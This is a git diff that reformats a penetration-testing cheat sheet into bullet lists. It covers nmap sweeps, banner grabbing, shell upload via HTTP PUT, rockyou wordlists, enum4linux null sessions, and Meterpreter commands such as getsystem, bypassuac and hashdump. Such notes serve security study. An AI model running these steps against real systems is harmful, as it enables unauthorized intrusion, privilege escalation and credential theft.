@@ -12,17 +12,17 @@ To add routing,
 ## IP and MAC Address
 
 To check ip and mac addr,
-`ifconfig`
-`ip addr show [interface]`
+* `ifconfig`
+* `ip addr show [interface]`
 
 ---
 
 ## Checking ARP Cache
 
 To check the arp cache table,
-`arp -a`
-`arp`
-`ip neighbour`
+* `arp -a`
+* `arp`
+* `ip neighbour`
 
 ---
 
@@ -48,8 +48,8 @@ To perform whois lookup on a target,
 ## Ping Sweep
 
 To perform a ping sweep or find alive hosts on a network,
-`fping -a -g network/CIDR 2>/dev/null
-nmap -sn network/CIDR`
+* `fping -a -g network/CIDR 2>/dev/null`
+* `nmap -sn network/CIDR`
 
 ---
 
@@ -72,14 +72,14 @@ UDP Scanning,
 ## Banner grabbing for HTTP services
 
 To grab the banner of a host,
-`nc -v <machine IP> PORT`
-`HEAD / HTTP/1.0`
+* `nc -v <machine IP> PORT`
+* `HEAD / HTTP/1.0`
 
 ## Banner grabbing for HTTPS services
 
 To grab the banner of the host,
-`openssl s_client -connect <machine IP>:PORT`
-`HEAD / HTTP/1.0`
+* `openssl s_client -connect <machine IP>:PORT`
+* `HEAD / HTTP/1.0`
 
 To debug the host,
 `openssl s_client -connect hack.me:443 -debug`
@@ -98,16 +98,16 @@ To fingerprint webservers,
 ## HTTP Verbs (GET, POST, HEAD, DELETE, PUT, OPTIONS)
 
 To view what other http verbs are available, use OPTIONS verb,
-`nc <machine IP> 80`
-`OPTIONS / HTPP/1.0`
+* `nc <machine IP> 80`
+* `OPTIONS / HTPP/1.0`
 
 Using http verbs to upload a shell. Find the content-length then use PUT to upload the shell. Make sure you include the size of the payload when using the PUT command,
-`wc -m shell.php`
-`x shell.php`
+* `wc -m shell.php`
+* `x shell.php`
 
-`PUT /shell.php`
-`Content-type: text/html`
-`Content-length: x`
+* `PUT /shell.php`
+* `Content-type: text/html`
+* `Content-length: x`
 
 ---
 ## Directory and File Scanning
@@ -125,11 +125,11 @@ Using dirb,
 ## Advance Google Search
 
 To use google dorks,
-`site:`
-`intitle:`
-`inurl:`
-`filetype:`
-`AND, OR, &, |, -`
+* `site:`
+* `intitle:`
+* `inurl:`
+* `filetype:`
+* `AND, OR, &, |, -`
 
 ---
 ## Cross Site Scripting (XSS) Steps:
@@ -187,9 +187,9 @@ user list,
 **/usr/share/ncrack/minimal.usr**
 
 passwords list(s),
-**/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt**
-**/usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt**
-**/usr/share/wordlists/rockyou.txt**
+* **/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt**
+* **/usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt**
+* **/usr/share/wordlists/rockyou.txt**
 
 nmap scripts,
 **/usr/share/nmap/scripts**
@@ -239,10 +239,9 @@ List shares using smbclient,
 Mount Shares using smbclient,
 `smbclient //<machine IP>/share -N`
 
-Exploiting Null Sessions using Enum4linux:
-
-To check if the remote host is vulnerable to null session
+Exploiting Null Sessions using Enum4linux: To check if the remote host is vulnerable to null session,
 `enum4linux -n 192.168.99.162`
+
 To gather info,
 `enum4linux -a <machine IP>`
 
@@ -267,25 +266,25 @@ Without banner,
 `msfconsole -q`
 
 after starting of MSF, these are the basic commands,
-`search x`
-`use x`
-`info`
-`options, show advanced options`
-`SET X (e.g. set RHOST 10.10.10.10, set payload x)`
+* `search x`
+* `use x`
+* `info`
+* `options, show advanced options`
+* `SET X (e.g. set RHOST 10.10.10.10, set payload x)`
 
 ## Meterpreter Commands
 
 After getting meterpreter shell, we'll can issue some commands which will help us in exploiting the machine,
-`background`
-`sessions -l`
-`sessions -i N (N is number)`
-`sysinfo, ifconfig, route, getuid`
-`getsystem (privesc)`
-`bypassuac`
-`download x /root/`
-`upload x C:\\Windows`
-`shell`
-`hashdump`
+* `background`
+* `sessions -l`
+* `sessions -i N (N is number)`
+* `sysinfo, ifconfig, route, getuid`
+* `getsystem (privesc)`
+* `bypassuac`
+* `download x /root/`
+* `upload x C:\\Windows`
+* `shell`
+* `hashdump`
 
 For auto routing,
 `use post/multi/manage/autoroute`
